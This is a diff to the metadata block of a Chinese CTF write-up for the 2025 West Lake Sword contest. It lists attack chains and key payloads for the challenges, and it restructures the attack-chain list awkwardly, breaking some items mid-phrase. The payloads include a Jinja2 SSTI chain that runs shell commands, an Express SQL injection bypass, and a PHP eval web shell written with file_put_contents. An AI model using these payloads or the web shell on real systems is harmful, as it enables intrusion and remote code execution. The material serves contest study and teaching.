@@ -10,7 +10,12 @@ tags:
 - PHPRCE写shell
 - Vpwn
 - PWN-Heaven's door,Crypto-matrixRSA,Disk取证,Crypto-DSA验证,内存取证AESEAX,Web-入异步并发查找
-attack_chain: 'SSTI: ?info=触发SSTI `{{x.__init__.__globals__[''__builtins__''][''eval'']("__import__(''os'').popen(''head /flagff149'').read()")}}` 编码unicode转义|Express SQL注入: ?info={"username":"$` or 1=1%23","password":"123"} 注入引号绕/''"''禁用|写shell: GET /admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0/ 找PHP→<?php file_put_contents("Uploads/127.0.0.1/111.php", "<?php @eval($_POST[''cmd'']);?>")?>|DSA验证: tshark提取→DSS.verify base64签名→altered_data.csv|RSA矩阵: Coppersmith small_roots解p→C^d求M|AES-EAX+RC4签名: volatility envars hackkey+RSA-OAEP解aes_key+RC4解签名|PWN-Vpwn: 32位高低地址分8次edit|Heaven''s door: 32/64位切换+open /proc/pid/mem'
+attack_chain:
+- 'SSTI: ?info=触发SSTI `{{x.__init__.__globals__[''__builtins__''][''eval'']("__import__(''os'').popen(''head /flagff149'').read()")}}` 编码unicode转义|Express SQL注入: ?info={"username":"$` or 1=1%23","password":"123"} 注入引号绕/''"''禁用|写shell: GET /admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0/ 找PHP'
+- '<?php file_put_contents("Uploads/127.0.0.1/111.php", "<?php @eval($_POST[''cmd'']);?>")?>|DSA验证: tshark提取'
+- 'DSS.verify base64签名'
+- 'altered_data.csv|RSA矩阵: Coppersmith small_roots解p'
+- 'C^d求M|AES-EAX+RC4签名: volatility envars hackkey+RSA-OAEP解aes_key+RC4解签名|PWN-Vpwn: 32位高低地址分8次edit|Heaven''s door: 32/64位切换+open /proc/pid/mem'
 key_payload: '{{x.__init__.__globals__[''__builtins__''][''eval'']("__import__(''os'').popen(''head /flagff149'').read()")}}|?info={"username":"$` or 1=1%23","password":"123"}|tshark -r filter1.pcapng -T fields -e http.request.uri.query.parameter -e json.object|p0<<100+x, f.small_roots(X=2^100, beta=0.4)|AES_EAX.decrypt_and_verify(ciphertext, tag)|edit(18..25) 分写32+32位'
 one_liner: 金石滩小鲨鱼第10名WP,12题(签到/Rank-l/sqli-or-not/Rank-U/Vpwn/Heaven's door/matrixRSA/糟糕的磁盘/blink/sharkp/easydatalog/DSASignatureData/easyrawencode),涵盖SSTI unicode转义+Express JSON注入+async并发查找PHP写shell+矩阵RSA+32/64切换PWN+DSA验证+内存取证AES+RC4签名
 lesson: 1) SSTI黑名单绕:用unicode转义\u0062\u0069(对应b/i)拼builtins; 2) Express SQL注入:JSON.parse+字符串模板replace,username用$`反引号绕过引号过滤; 3) async并发查找PHP文件:aiohttp+aiohttp.TCPConnector(limit=600)并发扫描,目标URL/admin/Uploads/{md5}/ 找PHP; 4) PHP file_put_contents写shell:folder = "Uploads/127.0.0.1/"; content = "<?php phpinfo();@eval($_POST['cmd']); ?>"; 5) tshark提取DSA签名:'-T fields -e http.request.uri.query.parameter -e json.object -E separator=, > extracted_data.txt'; 6) PWN Vpwn 64位地址分32+32位写; 7) Heaven's door:32位shellcode+retfq+CS=0x33+open /proc/pid/mem+lseek SEEK_SET+write
@@ -58,6 +63,9 @@ prerequisites:
 - Jinja2 SSTI 利用链（__globals__/__builtins__）
 - phar 反序列化触发原理
 - Python asyncio 异步并发
+contest_normalized: "西湖论剑"
+contest_year: 2025
+subcategory_guess: "sql_injection"
 ---
 # 第八届西湖论剑·中国杭州网络安全技能大赛网络攻防实战赛-初赛 WriteUp by 金石滩小鲨鱼
 
